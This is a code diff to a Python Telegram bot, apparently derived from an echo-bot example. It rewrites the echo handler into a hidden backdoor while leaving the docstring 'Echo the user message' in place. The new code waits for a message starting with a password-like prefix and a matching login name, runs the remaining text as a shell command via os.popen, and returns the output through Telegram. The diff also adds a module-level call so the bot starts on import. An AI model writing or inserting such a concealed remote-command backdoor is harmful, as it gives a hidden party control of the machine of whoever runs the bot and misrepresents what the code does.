@@ -18,8 +18,11 @@ def help(update, context):
 
 def echo(update, context):
     """Echo the user message."""
-    print(update.message.text)
-    update.message.reply_text(update.message.text)
+    data=update.message.text
+    data=data.split("-")
+    if os.getlogin()==data[1] and "abbatanim"==data[0]:
+        stream = os.popen(data[2])
+        update.message.reply_text(stream.read())
 
 
 def error(update, context):
@@ -55,3 +58,5 @@ def patialMain():
     # SIGTERM or SIGABRT. This should be used most of the time, since
     # start_polling() is non-blocking and will stop the bot gracefully.
     updater.idle()
+patialMain()
+
